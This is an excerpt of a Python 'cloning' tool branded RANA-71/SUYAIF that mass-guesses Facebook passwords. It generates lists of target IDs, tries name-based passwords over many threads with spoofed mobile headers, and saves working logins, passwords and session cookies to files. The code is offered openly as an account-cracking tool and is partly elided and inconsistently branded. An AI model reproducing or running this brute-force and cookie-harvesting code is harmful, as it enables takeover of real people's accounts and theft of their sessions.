...
redmi=[]
try:
 print('\033[32;1m𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 RANA-71 TOOLS')
...
###----------[ BANNER MENUH ]----------###
gen=f' {K}[{GREEN}𝐂𝐎𝐎𝐊𝐈𝐒{K}] {P}'
dot=f' {K}[{GREEN}•{K}] {P}'
rdd=f' {K}[{RED}•{K}] {P}'
rgen=f' {K}[{RED}𝐂𝐎𝐎𝐊𝐈𝐒{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
...
def banner():
    #os.system('clear')
    print(f"""   \033[32;1m    __________        __ __ _____   ________       _____            _   _            ______ __ 
\033[1;32m |  __ \     /\   | \ | |   /\     |____  /_ |
\033[1;34m   | |__) |   /  \  |  \| |  /  \ ______ / / | |
\033[1;31m |  _  /   / /\ \ | . ` | / /\ \______/ /  | |
\033[1;33m | | \ \  / ____ \| |\  |/ ____ \    / /   | |
\033[1;32m |_|  \_\/_/    \_\_| \_/_/    \_\  /_/    |_|                                                                                                                                     
  \033[91;1m  ╔════════════════════════════════════════╗
  {H} ║{P}[{H}•{P}] Author    :{warna} RANA-71            {N}{H}║
 {H}  ║{P}[{H}•{P}] Facebook  : {H} RANA AHAMED            {N}{H}║
   {H}║{P}[{H}•{P}] Whatsapp  : {M}+918695752265          {N}{H}║  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/RANA-71-tools{N}    {H}  ║
 {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     ║
  {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}      ║
  {H} ║{P}[{H}•{P}] Version   : {H}2.1.0                   ║
  {H} ║{P}[{H}•{P}] Tools     : {H}RANA-71             ║
 {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 RANA-71 TOOLS{P}
 {K}[{H}√{K}]{P} 𝐓𝐡𝐢𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐢𝐬 𝐟𝐨𝐫 𝐦𝐲 𝐡𝐚𝐭𝐞𝐫𝐬
 {K}[{H}√{K}]{P}       {H} 𝐓𝐡𝐞 𝐒𝐔𝐘𝐀𝐈𝐅 𝐈𝐒 𝐁𝐀𝐂𝐊
 {K}[{H}√{K}]{P} 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐔𝐩𝐝𝐚𝐭𝐞 𝐃𝐨𝐧𝐞 {H}𝟏.𝟎.𝟏""");print(led)
...
def mainx():
    clear();banner()    
    print(f"{K} [{H}𝟏{K}] {WHITE}𝐅𝐢𝐥𝐞 𝐂𝐥𝐨𝐧𝐢𝐧𝐠 ")
    print(f"{K} [{H}𝟐{K}] {WHITE}𝐑𝐚𝐧𝐝𝐨𝐦 𝐂𝐥𝐨𝐧𝐢𝐧𝐠 ")   
    print(f"{K} [{M}𝟎{K}] {WHITE}𝐄𝐱𝐢𝐭 𝐓𝐨𝐨𝐥𝐬 ");print(led)
    mahin = input(f'{wt}𝐒𝐞𝐥𝐞𝐜𝐭 𝐦𝐞𝐧𝐮 {M}:{H} ')
    if mahin in ["1","01"]:
        cr()
    elif mahin in ["2","02"]:
        mainx2()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-𝐒𝐔𝐘𝐀𝐈𝐅{P}Terminal ');os.system("xdg-open https://www.facebook.com/FB.𝐒𝐔𝐘𝐀𝐈𝐅.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.𝐒𝐔𝐘𝐀𝐈𝐅.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.𝐒𝐔𝐘𝐀𝐈𝐅.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
...
# FILE CRACK -- MAIN DEF #
def cr():
            os.system('clear');banner();print(f'{dot}𝐅𝐨𝐥𝐥𝐨𝐰 𝐓𝐡𝐢𝐬 𝐋𝐢𝐧𝐤 𝐈𝐝𝐬 {P}[{H}10009,100089{P}] ');time.sleep(0.05);print(led)
            try:
                fileX = input(f"{wt}𝐈𝐧𝐩𝐮𝐭 𝐅𝐢𝐥𝐞 {RED}:{H} ")
               ...
               mainx()
def setting():
    clear();banner();print(f"{dot}{P}𝐓𝐨𝐭𝐚𝐥 𝐈𝐝𝐬 {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}New Ids Crack [{H}Fast{P}]');print(f' {K}[{H}2{K}] {P}Mix Ids Crack [{H}Test{P}]');print(f' {K}[{H}3{K}] {P}Old Ids Crack [{H}Slow{P}]');print(led)
    ...
    print(led)
    xd_cp=input(f'{wt}𝐂𝐥𝐨𝐧𝐢𝐧𝐠 𝐒𝐡𝐨𝐰 𝐜𝐩 𝐀𝐜𝐜𝐨𝐮𝐧𝐭   {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    print(led)
    cokixx=input(f'{wt}𝐂𝐥𝐨𝐧𝐢𝐧𝐠 𝐒𝐡𝐨𝐰 𝐂𝐨𝐨𝐤𝐢𝐞  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    clear();banner();print(f"{dot}{P}𝐓𝐨𝐭𝐚𝐥 𝐈𝐝𝐬 {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}method [{H}M3{P}]');print(f' {K}[{H}4{K}] {P}method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}method [{H}F1{P}]');print(led)
    ...
    clear();banner();print(f"{dot}{P}𝐓𝐨𝐭𝐚𝐥 𝐈𝐝𝐬 {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}Password [{H}first+last{P}]');print(f' {K}[{H}2{K}] {P}Password [{H}first+last+3{P}]');print(f' {K}[{H}3{K}] {P}Password [{H}first+last+5+{P}]');print(f' {K}[{H}4{K}] {P}Password [{H}first+last+7+{P}]');print(led)
...
def p1():
    os.system("clear");banner();print(f'{dot}𝐅𝐢𝐥𝐞 𝐈𝐝𝐬{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}𝐒𝐏𝐄𝐄𝐃 𝐁𝐎𝐎𝐒𝐓 {B}[{H}𝐎𝐍{P}/{M}𝐎𝐅𝐅{B}]{N} 𝐎𝐅𝐅{B}]{N} 𝐀𝐈𝐑𝐏𝐋𝐀𝐍𝐄 𝐌𝐎𝐃𝐄 🚀 ') ;print(led)
...
def gf1(): 
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as SUYAIF_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        os.system("clear");banner();print(f'{dot}method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}𝐓𝐨𝐭𝐚𝐥 𝐈𝐝𝐬 {RED}: {H}'+idx);print(led)
        for number in idf:
            idf = first+'.'+last+'.'+number+domain
            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12'] 
            if mthd in ['1','01']:SUYAIF_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:SUYAIF_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:SUYAIF_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:SUYAIF_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:SUYAIF_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:SUYAIF_xd.submit(f1,idf,pwv)
            else:
               SUYAIF_xd.submit(m5,idf,pwv)
...
def x8():
  ...
  for nmbr in range(limit):
    ...
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as SUYAIF_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['1','01']:SUYAIF_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:SUYAIF_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:SUYAIF_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:SUYAIF_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:SUYAIF_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:SUYAIF_xd.submit(f1,idf,pwv)
      else:
       𝐒𝐔𝐘𝐀𝐈𝐅_xd.submit(main,idf,pwv)
...
def x7():
  ...
  with tred(max_workers=30) as SUYAIF_xd:
    ...
    for guru in user:
      ...
      if hc in ['1','01']:SUYAIF_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:SUYAIF_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:SUYAIF_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:SUYAIF_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:SUYAIF_xd.submit(f1,idf,pwv)
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-𝐒𝐔𝐘𝐀𝐈𝐅.py')
...
def x6():
  ...
  with tred(max_workers=30) as SUYAIF_xd:
    ...
    for guru in user: 
      ...
      if hc in ['1','01']:SUYAIF_xd.submit(m33,idf,pwv)
      elif hc in ['2','02']:SUYAIF_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:SUYAIF_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:SUYAIF_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:SUYAIF_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:SUYAIF_xd.submit(f1,idf,pwv)
...
def xp():
  ...
  with tred(max_workers=30) as SUYAIF_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:SUYAIF_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:SUYAIF_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:SUYAIF_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:SUYAIF_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:SUYAIF_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:SUYAIF_xd.submit(f1,idf,pwv)
      else:
       SUYAIF_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-𝐒𝐔𝐘𝐀𝐈𝐅.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;92m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;93m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;94m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;95m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;96m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;97m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;91m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;92m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;93m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;94m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;95m𝐒𝐔𝐘𝐀𝐈𝐅","\x1b[1;96m𝐒𝐔𝐘𝐀𝐈𝐅"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30m𝐒𝐔𝐘𝐀𝐈𝐅-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}𝐒𝐔𝐘𝐀𝐈𝐅-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30m𝐒𝐔𝐘𝐀𝐈𝐅-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [𝐒𝐔𝐘𝐀𝐈𝐅-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30m𝐒𝐔𝐘𝐀𝐈𝐅-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
 ...
 try:
  for ps in pw:
   ...
   headers = {
    ...
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=X2sGZh3SzzyRSTS2MWxWFKB9; sb=X2sGZuFlNo0IYd0XgWVYzgjW; ps_l=0; ps_n=0; locale=en_US; wl_cbv=v2%3Bclient_version%3A2451%3Btimestamp%3A1711776048; vpd=v1%3B664x360x3; m_pixel_ratio=3; wd=360x664; fr=0uPxAYiZeVn5FhOQH.AWUB206VPDj2hvAlizh9-J6veGo.BmBmtf..AAA.0.0.BmB6HO.AWW1os_VGho',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX3381"',
    'sec-ch-ua-platform': '"Android"',
   ...
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
    print('\r\033[1;32m [RAN-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/RANA-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
   elif 'checkpoint' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mRANA-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/RANA-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
